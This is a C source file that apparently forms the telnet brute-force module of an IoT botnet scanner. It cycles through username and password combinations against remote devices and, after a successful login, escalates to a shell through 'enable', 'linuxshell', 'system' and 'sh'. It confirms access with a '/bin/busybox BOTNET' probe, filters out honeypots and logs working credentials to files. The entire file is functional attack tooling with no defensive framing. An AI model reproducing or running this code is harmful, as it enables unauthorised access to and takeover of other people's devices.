#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <time.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/epoll.h>
#include <netinet/tcp.h>

#include "include/config.h"
#include "include/bruter.h"
#include "include/combos.h"

int brute_epfd = -1;
BruteConn *brute_conns = NULL;
pthread_mutex_t brute_conns_mutex = PTHREAD_MUTEX_INITIALIZER;

volatile int g_brute_active = 0;
volatile int g_brute_found = 0;
volatile int g_brute_failed = 0;
volatile int g_brute_honeypots = 0;
volatile int g_brute_logged = 0;

static void sockprintf(int fd, const char *fmt, ...) {
    char buf[512];
    va_list ap;
    va_start(ap, fmt);
    int len = vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    if (len > 0) send(fd, buf, len, MSG_NOSIGNAL);
}

static void strip_iacs(BruteConn *bc) {
    unsigned char *src = (unsigned char *)bc->rdbuf;
    unsigned char *dst = (unsigned char *)bc->rdbuf;
    int i = 0, out = 0;

    while (i < bc->rdbuf_pos) {
        if (src[i] != 0xFF) {
            dst[out++] = src[i++];
            continue;
        }

        if (i + 1 >= bc->rdbuf_pos) break;

        if (src[i+1] == 0xFF) {
            dst[out++] = 0xFF;
            i += 2;
            continue;
        }

        if (src[i+1] == 0xFD) {
            if (i + 2 >= bc->rdbuf_pos) break;
            unsigned char opt = src[i+2];

            if (opt == 31) {
                unsigned char tmp1[3] = {255, 251, 31};
                unsigned char tmp2[9] = {255, 250, 31, 0, 80, 0, 24, 255, 240};
                send(bc->fd, tmp1, 3, MSG_NOSIGNAL);
                send(bc->fd, tmp2, 9, MSG_NOSIGNAL);
            } else {
                unsigned char resp[3] = {0xFF, 0xFC, opt};
                send(bc->fd, resp, 3, MSG_NOSIGNAL);
            }
            i += 3;
        } else if (src[i+1] == 0xFB) {
            if (i + 2 >= bc->rdbuf_pos) break;
            unsigned char resp[3] = {0xFF, 0xFD, src[i+2]};
            send(bc->fd, resp, 3, MSG_NOSIGNAL);
            i += 3;
        } else if (src[i+1] == 0xFA) {
            i += 2;
            while (i < bc->rdbuf_pos - 1) {
                if (src[i] == 0xFF && src[i+1] == 0xF0) {
                    i += 2;
                    break;
                }
                i++;
            }
        } else {
            if (i + 2 >= bc->rdbuf_pos) break;
            i += 3;
        }
    }

    bc->rdbuf_pos = out;
    bc->rdbuf[out] = 0;
}

static int check_login_resp(BruteConn *bc) {
    if (strstr(bc->rdbuf, "sername") || strstr(bc->rdbuf, "ogin") ||
        strstr(bc->rdbuf, "nter") || strstr(bc->rdbuf, "assword"))
        return 1;
    return 0;
}

static int is_failure_resp(BruteConn *bc) {
    if (strstr(bc->rdbuf, "ncorrect") || strstr(bc->rdbuf, "ailed") ||
        strstr(bc->rdbuf, "nvalid") || strstr(bc->rdbuf, "enied") ||
        strstr(bc->rdbuf, "ad password") || strstr(bc->rdbuf, "oo many"))
        return 1;
    return 0;
}

static int has_shell_prompt(BruteConn *bc) {
    int len = bc->rdbuf_pos;
    while (len--) {
        char c = bc->rdbuf[len];
        if (c == '>' || c == '$' || c == '#' || c == '%')
            return 1;
    }
    return 0;
}

static int check_honeypot(BruteConn *bc) {
    if (strstr(bc->rdbuf, "richard"))
        return 1;
    return 0;
}

void brute_init(void) {
    brute_epfd = epoll_create1(0);
    brute_conns = calloc(MAX_FDS, sizeof(BruteConn));
}

void brute_disconnect(BruteConn *bc) {
    if (bc->fd > 0) {
        epoll_ctl(brute_epfd, EPOLL_CTL_DEL, bc->fd, NULL);
        close(bc->fd);
    }
    memset(bc, 0, sizeof(BruteConn));
    ATOMIC_DEC(&g_brute_active);
}

void brute_start(const char *addr, int port) {
    int fd = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
    if (fd < 0 || fd >= MAX_FDS) {
        if (fd >= 0) close(fd);
        return;
    }

    int opt = 1;
    setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &opt, sizeof(opt));

    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    inet_pton(AF_INET, addr, &sa.sin_addr);

    connect(fd, (struct sockaddr *)&sa, sizeof(sa));

    BruteConn *bc = &brute_conns[fd];
    memset(bc, 0, sizeof(BruteConn));
    bc->fd = fd;
    bc->port = port;
    bc->stage = ST_CONNECTING;
    bc->last_recv = time(NULL);
    strncpy(bc->address, addr, ADDR_LEN - 1);

    struct epoll_event ev;
    ev.events = EPOLLOUT | EPOLLIN | EPOLLET;
    ev.data.fd = fd;
    epoll_ctl(brute_epfd, EPOLL_CTL_ADD, fd, &ev);

    ATOMIC_INC(&g_brute_active);
}

void brute_check_connect(int fd) {
    int err = 0;
    socklen_t len = sizeof(err);
    getsockopt(fd, SOL_SOCKET, SO_ERROR, &err, &len);

    BruteConn *bc = &brute_conns[fd];

    if (err != 0) {
        brute_disconnect(bc);
        ATOMIC_INC(&g_brute_failed);
        return;
    }

    bc->stage = ST_IAC;
    bc->last_recv = time(NULL);

    struct epoll_event ev;
    ev.events = EPOLLIN | EPOLLET;
    ev.data.fd = fd;
    epoll_ctl(brute_epfd, EPOLL_CTL_MOD, fd, &ev);
}

static void brute_reconnect(BruteConn *bc, int next_idx) {
    char addr[ADDR_LEN];
    int port = bc->port;
    strncpy(addr, bc->address, ADDR_LEN);
    brute_disconnect(bc);

    int new_fd = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
    if (new_fd < 0 || new_fd >= MAX_FDS) {
        if (new_fd >= 0) close(new_fd);
        ATOMIC_INC(&g_brute_failed);
        return;
    }

    int opt = 1;
    setsockopt(new_fd, IPPROTO_TCP, TCP_NODELAY, &opt, sizeof(opt));

    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    inet_pton(AF_INET, addr, &sa.sin_addr);
    connect(new_fd, (struct sockaddr *)&sa, sizeof(sa));

    BruteConn *nbc = &brute_conns[new_fd];
    memset(nbc, 0, sizeof(BruteConn));
    nbc->fd = new_fd;
    nbc->port = port;
    nbc->combo_idx = next_idx;
    nbc->stage = ST_CONNECTING;
    nbc->last_recv = time(NULL);
    memcpy(nbc->address, addr, ADDR_LEN - 1);
    nbc->address[ADDR_LEN - 1] = 0;

    struct epoll_event ev;
    ev.events = EPOLLOUT | EPOLLIN | EPOLLET;
    ev.data.fd = new_fd;
    epoll_ctl(brute_epfd, EPOLL_CTL_ADD, new_fd, &ev);

    ATOMIC_INC(&g_brute_active);
}

void brute_handle_data(int fd) {
    BruteConn *bc = &brute_conns[fd];
    if (bc->fd <= 0) return;

    if (bc->rdbuf_pos >= RDBUF_SIZE - 1) {
        bc->rdbuf_pos = 0;
        memset(bc->rdbuf, 0, RDBUF_SIZE);
    }

    int total_read = 0;
    while (1) {
        int space = RDBUF_SIZE - bc->rdbuf_pos - 1;
        if (space <= 0) break;
        int r = recv(fd, bc->rdbuf + bc->rdbuf_pos, space, MSG_NOSIGNAL);
        if (r > 0) {
            bc->rdbuf_pos += r;
            bc->rdbuf[bc->rdbuf_pos] = 0;
            total_read += r;
        } else {
            break;
        }
    }

    if (total_read <= 0) {
        if (bc->combo_idx < combo_count - 1) {
            brute_reconnect(bc, bc->combo_idx + 1);
        } else {
            brute_disconnect(bc);
            ATOMIC_INC(&g_brute_failed);
        }
        return;
    }

    bc->last_recv = time(NULL);

    if (bc->combo_idx >= combo_count) {
        brute_disconnect(bc);
        ATOMIC_INC(&g_brute_failed);
        return;
    }

    Combo *c = &combos[bc->combo_idx];

    strip_iacs(bc);

    switch (bc->stage) {
    case ST_CONNECTING:
        break;

    case ST_IAC:
        bc->stage = ST_WAIT_PROMPT;
        /* fall through — prompt may already be in buffer after strip_iacs */
        __attribute__((fallthrough));

    case ST_WAIT_PROMPT:
        if (check_login_resp(bc)) {
            sockprintf(fd, "%s\r\n", c->username);
            bc->rdbuf_pos = 0;
            memset(bc->rdbuf, 0, RDBUF_SIZE);
            bc->stage = ST_SENT_USER;
        }
        break;

    case ST_SENT_USER:
        if (strstr(bc->rdbuf, "assword") || strstr(bc->rdbuf, "asscode")) {
            sockprintf(fd, "%s\r\n", c->password);
            bc->rdbuf_pos = 0;
            memset(bc->rdbuf, 0, RDBUF_SIZE);
            bc->stage = ST_SENT_PASS;
        } else if (is_failure_resp(bc)) {
            if (bc->combo_idx < combo_count - 1) {
                brute_reconnect(bc, bc->combo_idx + 1);
            } else {
                ATOMIC_INC(&g_brute_failed);
                brute_disconnect(bc);
            }
        } else if (has_shell_prompt(bc)) {
            ATOMIC_INC(&g_brute_logged);
            FILE *fp = fopen("logged.txt", "a");
            if (fp) {
                fprintf(fp, "%s:%d %s:%s\n", bc->address, bc->port, c->username, c->password);
                fclose(fp);
            }
            sockprintf(fd, "enable\r\n");
            bc->rdbuf_pos = 0;
            memset(bc->rdbuf, 0, RDBUF_SIZE);
            bc->stage = ST_SEND_ENABLE;
        }
        break;

    case ST_SENT_PASS:
        if (is_failure_resp(bc) || check_login_resp(bc)) {
            if (bc->combo_idx < combo_count - 1) {
                brute_reconnect(bc, bc->combo_idx + 1);
            } else {
                ATOMIC_INC(&g_brute_failed);
                brute_disconnect(bc);
            }
        } else if (has_shell_prompt(bc)) {
            ATOMIC_INC(&g_brute_logged);
            FILE *fp = fopen("logged.txt", "a");
            if (fp) {
                fprintf(fp, "%s:%d %s:%s\n", bc->address, bc->port, c->username, c->password);
                fclose(fp);
            }
            sockprintf(fd, "enable\r\n");
            bc->rdbuf_pos = 0;
            memset(bc->rdbuf, 0, RDBUF_SIZE);
            bc->stage = ST_SEND_ENABLE;
        }
        break;

    case ST_SEND_ENABLE:
        sockprintf(fd, "linuxshell\r\n");
        bc->stage = ST_SEND_LSHELL;
        break;

    case ST_SEND_LSHELL:
        sockprintf(fd, "system\r\n");
        bc->stage = ST_SEND_SYSTEM;
        break;

    case ST_SEND_SYSTEM:
        sockprintf(fd, "sh\r\n");
        bc->stage = ST_SEND_SH;
        break;

    case ST_SEND_SH:
        sockprintf(fd, "/bin/busybox BOTNET\r\n");
        bc->rdbuf_pos = 0;
        memset(bc->rdbuf, 0, RDBUF_SIZE);
        bc->stage = ST_SEND_BUSYBOX;
        break;

    case ST_SEND_BUSYBOX:
        bc->stage = ST_WAIT_TOKEN;
        /* fall through */

    case ST_WAIT_TOKEN:
        if (check_honeypot(bc)) {
            printf("\033[93m[!] HONEYPOT %s:%d %s:%s\033[0m\n",
                   bc->address, bc->port, c->username, c->password);
            fflush(stdout);

            FILE *fp = fopen("honeypots.txt", "a");
            if (fp) {
                fprintf(fp, "%s:%d %s:%s\n", bc->address, bc->port, c->username, c->password);
                fclose(fp);
            }
            ATOMIC_INC(&g_brute_honeypots);
            brute_disconnect(bc);
        } else if (strstr(bc->rdbuf, "applet not found")) {
            printf("\033[92m[+] FOUND %s:%d %s:%s\033[0m\n",
                   bc->address, bc->port, c->username, c->password);
            fflush(stdout);

            FILE *fp = fopen("found.txt", "a");
            if (fp) {
                fprintf(fp, "%s:%d %s:%s\n", bc->address, bc->port, c->username, c->password);
                fclose(fp);
            }
            ATOMIC_INC(&g_brute_found);
            brute_disconnect(bc);
        } else if (strstr(bc->rdbuf, "not found") || strstr(bc->rdbuf, "No such") ||
                   strstr(bc->rdbuf, "not recognized") || strstr(bc->rdbuf, "command not") ||
                   is_failure_resp(bc) || check_login_resp(bc)) {
            brute_disconnect(bc);
            ATOMIC_INC(&g_brute_failed);
        }
        break;
    }
}
